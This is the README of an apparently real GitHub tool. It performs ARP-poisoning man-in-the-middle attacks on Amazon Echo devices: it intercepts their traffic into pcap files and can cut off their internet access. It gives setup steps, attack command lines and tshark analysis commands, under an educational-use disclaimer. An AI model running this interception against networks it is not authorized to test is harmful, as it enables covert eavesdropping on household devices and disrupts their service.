<div align="center">

# 🔊 Alexa ARP MITM

**An educational ARP man-in-the-middle tool for Amazon Echo / Alexa devices**

![Python](https://img.shields.io/badge/Python-3.9%2B-3776AB?style=flat-square&logo=python&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
![License](https://img.shields.io/badge/License-Educational%20Use%20Only-red?style=flat-square)
![Root](https://img.shields.io/badge/Requires-sudo%20%2F%20root-orange?style=flat-square)

</div>

---

> ⚠️ **FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**
> All tests documented here were performed on equipment owned by the author
> in an isolated lab environment. **Do not** run this tool on any network or
> device you do not own or have explicit written permission to test.
> Unauthorised use is illegal and unethical.

---

## 📖 Table of Contents

- [What It Does](#-what-it-does)
- [Features](#-features)
- [How It Works](#-how-it-works)
- [Requirements](#-requirements)
- [Installation](#-installation)
- [Usage](#-usage)
  - [Interactive Mode](#interactive-mode-recommended)
  - [Command-Line Mode](#command-line-mode)
  - [All Options](#all-options)
  - [Examples](#examples)
- [Inspecting Captured Traffic](#-inspecting-captured-traffic)
- [Disclaimer](#-disclaimer)

---

## 🎯 What It Does

`Alexa_ARP_MITM.py` places this machine **silently between** an Amazon Echo
(Alexa) device and its router using ARP cache poisoning. Every packet the
Alexa device sends or receives passes through this host first, where it is
saved to a `.pcap` file for offline analysis. Internet access can optionally
be cut off entirely while the capture is running.

---

## ✨ Features

| Feature | Description |
|---|---|
| 🧙 **Interactive wizard** | Prompts for every setting you didn't supply on the CLI — no config file editing required |
| 🔍 **Subnet scanner** | ARP-scans the local /24 and highlights likely Amazon / Alexa devices by MAC OUI |
| 🌐 **Auto-detect gateway** | Reads the OS routing table so you rarely need to type the gateway IP |
| 🖥️ **Auto-detect interface** | Lists all available interfaces and pre-selects the default route interface |
| ☠️ **ARP poisoning** | Poisons both the Alexa device and the router simultaneously |
| 📦 **Packet capture** | Writes intercepted traffic to a `.pcap` file (Wireshark-compatible) |
| 🔎 **BPF filter** | Limit captured packets to exactly what you need (e.g. `tcp port 443`) |
| 📊 **Live statistics** | Prints packet count and average capture rate at a configurable interval |
| 🚫 **Internet block** | Optional `iptables` rule that cuts Alexa's Internet access during the test |
| 🧹 **Graceful cleanup** | `Ctrl-C` / `SIGTERM` restores ARP caches, removes firewall rules, disables IP forwarding, and prints a final packet count |

---

## 🔬 How It Works

```
  ┌──────────┐   normal traffic    ┌─────────┐
  │  Alexa   │ ──────────────────► │ Router  │
  │  device  │ ◄────────────────── │ (GW)    │
  └──────────┘                     └─────────┘

  After ARP poisoning:

  ┌──────────┐    all traffic      ┌──────────────┐    forwarded    ┌─────────┐
  │  Alexa   │ ──────────────────► │  This host   │ ──────────────► │ Router  │
  │  device  │ ◄────────────────── │  (attacker)  │ ◄────────────── │ (GW)    │
  └──────────┘                     └──────────────┘                 └─────────┘
                                     ↓  pcap file
                                   alexa_mitm.pcap
```

1. **ARP spoofing** — the script sends forged ARP replies telling the Alexa device
   that the router's IP belongs to *this* machine's MAC, and telling the router that
   the Alexa device's IP also belongs to *this* machine's MAC.
2. **IP forwarding** — the Linux kernel is configured to relay packets between the
   two parties so neither side notices anything is wrong.
3. **Capture** — every packet that flows through is written to a `.pcap` file.
4. **Cleanup** — when the script exits it sends corrective ARP replies (×5) to
   both parties, restoring normal communication.

---

## 📋 Requirements

| Requirement | Version / Notes |
|---|---|
| **Python** | 3.9 or newer |
| **Scapy** | `pip install scapy` |
| **Linux** | Kali, Ubuntu, Debian, etc. |
| **iptables** | Pre-installed on most distros |
| **sudo / root** | Required for raw-socket and iptables access |

---

## 🚀 Installation

```bash
# 1. Clone the repository
git clone https://github.com/at0m-b0mb/alexa-attack.git
cd alexa-attack

# 2. Install the only Python dependency
pip install scapy

# 3. Verify everything is working
python3 Alexa_ARP_MITM.py --help
```

---

## 💻 Usage

### Interactive Mode *(recommended)*

Simply run the script with `sudo` and **no arguments**. The wizard detects
your gateway and network interface automatically and walks you through every
setting, offering sensible defaults at each step:

```
sudo python3 Alexa_ARP_MITM.py
```

```
============================================================
  Alexa ARP MITM – interactive setup
  (press Enter to accept the value shown in [brackets])
============================================================

  Available interfaces: eth0, wlan0
  Network interface [wlan0]:
  Gateway IP [192.168.1.1]:
  Scan the subnet to help identify the Alexa device? [Y/n]: y

  Scanning 192.168.1.0/24 on wlan0 – this may take a few seconds…

  IP              MAC                Note
  ----------------------------------------------
  192.168.1.1     aa:bb:cc:dd:ee:ff
  192.168.1.42    74:c2:46:11:22:33  ◀ likely Alexa / Amazon device
  192.168.1.100   de:ad:be:ef:00:01

  Alexa device IP [192.168.1.2]: 192.168.1.42
  Output PCAP file [alexa_mitm.pcap]:
  BPF capture filter (leave blank for all traffic) []:
  Block Alexa's Internet traffic via iptables? [Y/n]:
  ARP spoof interval (seconds) [2.0]:
  Live stats interval (seconds, 0 to disable) [10.0]:
```

You can also supply *some* flags and the wizard will only ask for the rest:

```bash
# Only the Alexa IP was given – wizard asks for everything else
sudo python3 Alexa_ARP_MITM.py --alexa-ip 192.168.1.42
```

---

### Command-Line Mode

Supply all required options as flags for fully non-interactive / scripted use:

```bash
sudo python3 Alexa_ARP_MITM.py \
    --alexa-ip   192.168.1.42 \
    --gateway-ip 192.168.1.1  \
    --interface  wlan0
```

---

### All Options

```
sudo python3 Alexa_ARP_MITM.py [OPTIONS]
```

| Flag | Default | Description |
|---|---|---|
| `--alexa-ip IP` | *(prompted)* | IP address of the target Alexa / Echo device |
| `--gateway-ip IP` | *(auto-detected)* | IP address of the default gateway |
| `--interface`, `-i IFACE` | *(auto-detected)* | Network interface for spoofing & sniffing |
| `--pcap FILE` | `alexa_mitm.pcap` | Output file for captured packets |
| `--filter`, `-f BPF` | *(all traffic)* | BPF expression to filter captured packets |
| `--no-drop` | *(not set)* | Skip the iptables Internet-block rule |
| `--spoof-interval SEC` | `2.0` | Seconds between ARP spoof packets |
| `--stats-interval SEC` | `10.0` | Seconds between live packet-count prints (`0` disables) |
| `--scan` | *(not set)* | Scan the subnet for hosts before starting |
| `--verbose`, `-v` | *(not set)* | Enable debug-level log output |
| `--help`, `-h` | | Show this help and exit |

---

### Examples

**Run the interactive wizard (easiest):**
```bash
sudo python3 Alexa_ARP_MITM.py
```

**Scan the subnet first, then start the attack:**
```bash
sudo python3 Alexa_ARP_MITM.py --scan \
    --gateway-ip 192.168.1.1 \
    --interface wlan0
```

**Capture only HTTPS traffic (port 443):**
```bash
sudo python3 Alexa_ARP_MITM.py \
    --alexa-ip 192.168.1.42 \
    --gateway-ip 192.168.1.1 \
    --filter "tcp port 443" \
    --pcap alexa_https.pcap
```

**Capture all traffic but do *not* block Internet access:**
```bash
sudo python3 Alexa_ARP_MITM.py \
    --alexa-ip 192.168.1.42 \
    --gateway-ip 192.168.1.1 \
    --no-drop
```

**Fast spoof rate with verbose logging:**
```bash
sudo python3 Alexa_ARP_MITM.py \
    --alexa-ip 192.168.1.42 \
    --gateway-ip 192.168.1.1 \
    --spoof-interval 0.5 \
    --verbose
```

**Disable live statistics:**
```bash
sudo python3 Alexa_ARP_MITM.py \
    --alexa-ip 192.168.1.42 \
    --gateway-ip 192.168.1.1 \
    --stats-interval 0
```

---

## 🔎 Inspecting Captured Traffic

```bash
# Quick summary of all captured packets
tshark -r alexa_mitm.pcap

# Show only DNS queries from the Alexa device
tshark -r alexa_mitm.pcap -Y "dns.flags.response == 0"

# Show only TLS handshakes (SNI field reveals destination hostnames)
tshark -r alexa_mitm.pcap -Y "tls.handshake.type == 1" \
       -T fields -e tls.handshake.extensions_server_name

# Open interactively in Wireshark for full protocol dissection
wireshark alexa_mitm.pcap
```

---

## ⚖️ Disclaimer

This project is provided **for educational and research purposes only**.

- Only use this tool on networks and devices **you own** or have **explicit
  written authorisation** to test.
- The author accepts **no responsibility** for any misuse, damage, or legal
  consequences arising from the use of this software.
- Intercepting network traffic without authorisation may be a **criminal
  offence** in your jurisdiction.

